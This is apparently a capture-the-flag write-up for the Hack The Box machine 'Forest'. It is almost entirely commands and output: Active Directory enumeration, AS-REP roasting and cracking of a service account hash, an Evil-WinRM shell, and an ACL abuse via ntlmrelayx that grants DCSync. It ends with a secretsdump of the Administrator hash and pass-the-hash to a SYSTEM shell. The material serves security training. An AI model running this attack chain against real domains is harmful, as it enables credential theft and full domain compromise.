Target: 10.10.10.161

## Enumeration:

nmap
```
$ sudo nmap -sC -sV 10.10.10.161

Nmap scan report for 10.10.10.161
Host is up (0.13s latency).
Not shown: 988 closed ports
PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     FOREST
|     version
|     bind
|   NULL: 
|_    FOREST
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-07-19 00:38:12Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds  Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: HTB
|   NetBIOS_Domain_Name: HTB
|   NetBIOS_Computer_Name: FOREST
|   DNS_Domain_Name: htb.local
|   DNS_Computer_Name: FOREST.htb.local
|   DNS_Tree_Name: htb.local
|   Product_Version: 10.0.14393
|_  System_Time: 2021-07-19T00:40:31+00:00
| ssl-cert: Subject: commonName=FOREST.htb.local
| Not valid before: 2021-07-17T07:31:37
|_Not valid after:  2022-01-16T07:31:37
|_ssl-date: 2021-07-19T00:40:46+00:00; +7m46s from scanner time.
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.91%I=7%D=7/18%Time=60F4C7A1%P=x86_64-pc-linux-gnu%r(NULL
SF:,35,"\x003\xb7\xca\x81\x82\0\x01\0\0\0\0\0\x01\x06FOREST\x03htb\0\0\xff
SF:\0\x01\0\0\)\x0f\xa0\0\0\0\0\0\x0c\0\n\0\x08\x9ev\xd8\xf1\x9f\x0b8U")%r
SF:(DNSVersionBindReqTCP,55,"\x003\xb7\xca\x81\x82\0\x01\0\0\0\0\0\x01\x06
SF:FOREST\x03htb\0\0\xff\0\x01\0\0\)\x0f\xa0\0\0\0\0\0\x0c\0\n\0\x08\x9ev\
SF:xd8\xf1\x9f\x0b8U\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\x04b
SF:ind\0\0\x10\0\x03");
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h31m46s, deviation: 3h07m51s, median: 7m45s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
```

editing /etc/hosts
```
$ sudo vim /etc/hosts

10.10.10.161    htb.local
```

enumerating with enum4linux
```
$ enum4linux -a 10.10.10.161

<snip>
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 881.
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
<snip>
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
<snip>
```

enumerating with ldapsearch
```
$ ldapsearch -h 10.10.10.161 -p 389 -x -b "dc=htb,dc=local" 

<snip>
# Sebastien Caron, Exchange Administrators, Information Technology, Employees, 
 htb.local
dn: CN=Sebastien Caron,OU=Exchange Administrators,OU=Information Technology,OU
 =Employees,DC=htb,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Sebastien Caron
sn: Caron
givenName: Sebastien
distinguishedName: CN=Sebastien Caron,OU=Exchange Administrators,OU=Informatio
 n Technology,OU=Employees,DC=htb,DC=local
instanceType: 4
whenCreated: 20190920002959.0Z
whenChanged: 20210718071846.0Z
displayName: Sebastien Caron
uSNCreated: 26021
uSNChanged: 8047612
name: Sebastien Caron
objectGUID:: FZgcKIpNfUKd9QkF33jQaw==
userAccountControl: 66048
badPwdCount: 1758
codePage: 0
countryCode: 0
badPasswordTime: 132709709567364307
lastLogoff: 0
lastLogon: 132136649695862270
pwdLastSet: 132134129995447247
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAALB4ltxV1shXFsPNPeQQAAA==
accountExpires: 9223372036854775807
logonCount: 8
sAMAccountName: sebastien
sAMAccountType: 805306368
userPrincipalName: sebastien@htb.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20210718074132.0Z
dSCorePropagationData: 20210718074132.0Z
dSCorePropagationData: 20210718074132.0Z
dSCorePropagationData: 20210718074132.0Z
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 132134965694676682

# Lucinda Berger, IT Management, Information Technology, Employees, htb.local
dn: CN=Lucinda Berger,OU=IT Management,OU=Information Technology,OU=Employees,
 DC=htb,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Lucinda Berger
sn: Berger
givenName: Lucinda
distinguishedName: CN=Lucinda Berger,OU=IT Management,OU=Information Technolog
 y,OU=Employees,DC=htb,DC=local
instanceType: 4
whenCreated: 20190920004413.0Z
whenChanged: 20210718071846.0Z
displayName: Lucinda Berger
uSNCreated: 26053
uSNChanged: 8047627
name: Lucinda Berger
objectGUID:: q9GHrGm870ePu/gGNSN5uQ==
userAccountControl: 66048
badPwdCount: 1598
codePage: 0
countryCode: 0
badPasswordTime: 132709726637885982
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132134138532338911
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAALB4ltxV1shXFsPNPegQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: lucinda
sAMAccountType: 805306368
userPrincipalName: lucinda@htb.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20210718074132.0Z
dSCorePropagationData: 20210718074132.0Z
dSCorePropagationData: 20210718074132.0Z
dSCorePropagationData: 20210718074132.0Z
dSCorePropagationData: 16010101000000.0Z

# svc-alfresco, Service Accounts, htb.local
dn: CN=svc-alfresco,OU=Service Accounts,DC=htb,DC=local

# Andy Hislip, Helpdesk, Information Technology, Employees, htb.local
dn: CN=Andy Hislip,OU=Helpdesk,OU=Information Technology,OU=Employees,DC=htb,D
 C=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Andy Hislip
sn: Hislip
givenName: Andy
distinguishedName: CN=Andy Hislip,OU=Helpdesk,OU=Information Technology,OU=Emp
 loyees,DC=htb,DC=local
instanceType: 4
whenCreated: 20190920223956.0Z
whenChanged: 20210718071846.0Z
displayName: Andy Hislip
uSNCreated: 28800
uSNChanged: 8047633
name: Andy Hislip
objectGUID:: yAbxsZT4YUy2cEg6WnYVpg==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132136658562910820
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAALB4ltxV1shXFsPNPfgQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: andy
sAMAccountType: 805306368
userPrincipalName: andy@htb.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20210718074132.0Z
dSCorePropagationData: 20210718074132.0Z
dSCorePropagationData: 20210718074132.0Z
dSCorePropagationData: 20210718074132.0Z
dSCorePropagationData: 16010101000000.0Z

# Mark Brandt, Sysadmins, Information Technology, Employees, htb.local
dn: CN=Mark Brandt,OU=Sysadmins,OU=Information Technology,OU=Employees,DC=htb,
 DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Mark Brandt
sn: Brandt
givenName: Mark
distinguishedName: CN=Mark Brandt,OU=Sysadmins,OU=Information Technology,OU=Em
 ployees,DC=htb,DC=local
instanceType: 4
whenCreated: 20190920225730.0Z
whenChanged: 20210718071846.0Z
displayName: Mark Brandt
uSNCreated: 28825
uSNChanged: 8047639
name: Mark Brandt
objectGUID:: Ym00op3FwEqFh1/oaBmf9g==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132134938502435678
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAALB4ltxV1shXFsPNPfwQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: mark
sAMAccountType: 805306368
userPrincipalName: mark@htb.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20210718074132.0Z
dSCorePropagationData: 20210718074132.0Z
dSCorePropagationData: 20210718074132.0Z
dSCorePropagationData: 20210718074132.0Z
dSCorePropagationData: 16010101000000.0Z

# Santi Rodriguez, Developers, Information Technology, Employees, htb.local
dn: CN=Santi Rodriguez,OU=Developers,OU=Information Technology,OU=Employees,DC
 =htb,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Santi Rodriguez
sn: Rodriguez
givenName: Santi
distinguishedName: CN=Santi Rodriguez,OU=Developers,OU=Information Technology,
 OU=Employees,DC=htb,DC=local
instanceType: 4
whenCreated: 20190920230255.0Z
whenChanged: 20210718071846.0Z
displayName: Santi Rodriguez
uSNCreated: 28837
uSNChanged: 8047618
name: Santi Rodriguez
objectGUID:: VSlmUT29FkGHUAJ12EnggA==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132134941751348277
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAALB4ltxV1shXFsPNPgAQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: santi
sAMAccountType: 805306368
userPrincipalName: santi@htb.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20210718074132.0Z
dSCorePropagationData: 20210718074132.0Z
dSCorePropagationData: 20210718074132.0Z
dSCorePropagationData: 20210718074132.0Z
dSCorePropagationData: 16010101000000.0Z
```

### Findings:Looking for attack vectors

Request a kerberos ticket for the account htb.local/svc-alfresco as it doesnt require Kerberos preauthentication to gain credentials.


## Foothold:

as-rep roasting with GetNPUsers
```
$ GetNPUsers.py htb.local/svc-alfresco -dc-ip 10.10.10.161 -no-pass

Impacket v0.9.24.dev1+20210611.72516.1a5ed9dc - Copyright 2021 SecureAuth Corporation

[*] Getting TGT for svc-alfresco
$krb5asrep$23$svc-alfresco@HTB.LOCAL:e0c0e4d0b9130fe574e8fd458cea6044$96ecf04453950637f170e73560bed5e9dedbf137d39489bde1ba467873a868cdd9b37b7da7f55823852a9706eefef2a7b6134e85fde2047144e7df724bd33822fce920dba9ec083319c152e2622c43b8f22ca71d2831fe289ad5c497ba407ac2abfe883d68b39bfaaa7273878069397b9c7efb6aaf8d13f07b36d8feabed546754b1312985d0de4e8b4c5c2afd25b4d7726e9a3ccc30f6d5d64db6a8a194ad769eabb710813e36662bd7f22dd7bde02811f8998cfb39bdf79ffd63a590299072a304b6571bd2c6a9284dcea0bd5b0d34ea040e4aa3683b8f41bf0de89e57e34fada7e30f510c
```

cracking hash
```
$ john --wordlist=/usr/share/wordlists/rockyou.txt hash

s3rvice          ($krb5asrep$23$svc-alfresco@HTB.LOCAL)
```

Loot:

`svc-alfresco:s3rvice`

```
$ evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice 

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> whoami

htb\svc-alfresco
```

```
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> cd ..\Desktop

*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> dir

    Directory: C:\Users\svc-alfresco\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        9/23/2019   2:16 PM             32 user.txt

*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> type user.txt

<redacted>
```


## Priv Escalations:

enumerating user privilages
```
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

enumerating with bloodhound
```
$ bloodhound-python -u svc-alfresco -p s3rvice -ns 10.10.10.161 -d htb.local -gc forest.htb.local -c all

INFO: Found AD domain: htb.local
INFO: Connecting to LDAP server: FOREST.htb.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: FOREST.htb.local
WARNING: Could not resolve SID: S-1-5-21-3072663084-364016917-1341370565-1153
INFO: Found 34 users
INFO: Found 75 groups
WARNING: Could not resolve SID: S-1-5-21-3072663084-364016917-1341370565-7602
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: EXCH01.htb.local
INFO: Querying computer: FOREST.htb.local
INFO: Done in 00M 28S
```

starting bloodhound
```
$ sudo neo4j console

$ bloodhound
```

uploading data

![upload]()

checking shortest path to high value targets

![sp to hvt]()

checking principal with dcsync rights

![dcsync]()

dsync explain

creating user bob with
```
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> net user bob abc123! /add /domain

The command completed successfully.                                                                                
                                                                                                                   
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> net group "Exchange Windows Permissions" bob /add

The command completed successfully.

*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> net localgroup "Remote Management Users" bob /add

The command completed successfully
```

openning a DCSYNC listener and relay to modify user bob's acl
```
$ sudo ntlmrelayx.py -t ldap://10.10.10.161 --escalate-user bob 

Impacket v0.9.24.dev1+20210611.72516.1a5ed9dc - Copyright 2021 SecureAuth Corporation

[*] Protocol Client MSSQL loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client DCSYNC loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up HTTP Server
[*] Setting up WCF Server

[*] Servers started, waiting for connections
[*] HTTPD: Received connection from 127.0.0.1, attacking target ldap://10.10.10.161
[*] HTTPD: Client requested path: /
[*] HTTPD: Client requested path: /
[*] HTTPD: Client requested path: /
[*] Authenticating against ldap://10.10.10.161 as \bob SUCCEED
[*] Enumerating relayed user's privileges. This may take a while on large domains
[*] User privileges found: Create user
[*] User privileges found: Modifying domain ACL
[*] Querying domain security descriptor
[*] Success! User bob now has Replication-Get-Changes-All privileges on the domain
[*] Try using DCSync with secretsdump.py and this user :)
[*] Saved restore state to aclpwn-20210719-002609.restore
[*] Dumping domain info for first time
[*] Domain info dumped into lootdir!
```

dumping sam hashes
```
$ sudo secretsdump.py 'htb.local/bob:abc123!@10.10.10.161'

Impacket v0.9.24.dev1+20210611.72516.1a5ed9dc - Copyright 2021 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
<snip>
```

loggin with pass the hash
```
$ psexec.py htb.local/Administrator@10.10.10.161 -hashes aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42

Impacket v0.9.24.dev1+20210611.72516.1a5ed9dc - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on 10.10.10.161.....
[*] Found writable share ADMIN$
[*] Uploading file tlswpedp.exe
[*] Opening SVCManager on 10.10.10.161.....
[*] Creating service yphq on 10.10.10.161.....
[*] Starting service yphq.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami

nt authority\system
```

```
C:\Windows\system32>cd C:\Users\Administrator\Desktop

C:\Users\Administrator\Desktop>type root.txt

<redacted>
```